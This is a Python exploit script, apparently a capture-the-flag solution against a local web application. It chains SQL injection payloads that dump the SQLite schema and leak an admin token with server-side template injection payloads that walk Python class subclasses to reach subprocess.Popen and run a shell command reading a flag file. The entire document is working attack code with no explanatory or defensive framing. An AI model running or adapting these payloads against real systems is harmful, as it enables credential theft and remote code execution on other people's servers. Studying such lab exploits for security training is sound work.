import requests

URL = 'http://localhost:8000'
SHELL = ['cat', '/flag']

# -1. Leak the table schema
res = requests.get(URL + "/nonexistant' UNION SELECT sql,'a',NULL FROM sqlite_master LIMIT 1 OFFSET 1 -- ")
print('-- Table Schema --')
print(res.text.split(' | ')[1].split('</title>')[0].strip())


# 1. Leak the admin token
res = requests.get(URL + "/nonexistant' UNION SELECT auth,'a',NULL FROM pages WHERE route='admin' -- ")
print('-- Admin Token --')
print(token := res.text.split(' | ')[1].split('</title>')[0].strip())

# 2. Create a new page
res = requests.post(URL + "/api/page", data={
    'route': 'exploit',
    'title': 'Hello',
    'auth':  'World',
    'template': '{{ "".__class__.__mro__[1].__subclasses__() }}',
    'token': token
})

print('-- Exploit Page --')
print(route := res.text)

# 3. Execute the payload and get the list of classes
res = requests.get(URL + '/' + route, params={'token': 'World'})
classes = []
for klass in res.text.split('<div>[')[1].split(']</div>')[0].split(','):
    classes.append(klass.split('&#39;')[1])

print('-- Subprocess Classes --')
subproc_idx = -1
for i, klass in enumerate(classes):
    if klass == 'gevent.subprocess.Popen':
        print(i, klass)
        subproc_idx = i

print(f'Found reference to subprocess.Popen at {subproc_idx}')

# 4. Prepare a payload to execute shell
res = requests.post(URL + "/api/page", data={
    'route': 'exploit',
    'title': 'Hello',
    'auth':  'World',
    'template': '{{ "".__class__.__mro__[1].__subclasses__()[' + str(subproc_idx) + '](' + str(SHELL) + ', stdout=-1).stdout.read().decode() }}',
    'token': token
})
print('-- Exploit Page --')
print(route := res.text)

# 5. Execute new payload
res = requests.get(URL + '/' + route, params={'token': 'World'})
print('-- FLAG --')
print(res.text.split('</h1>')[1].split('<div>')[1].split('</div>')[0].strip())
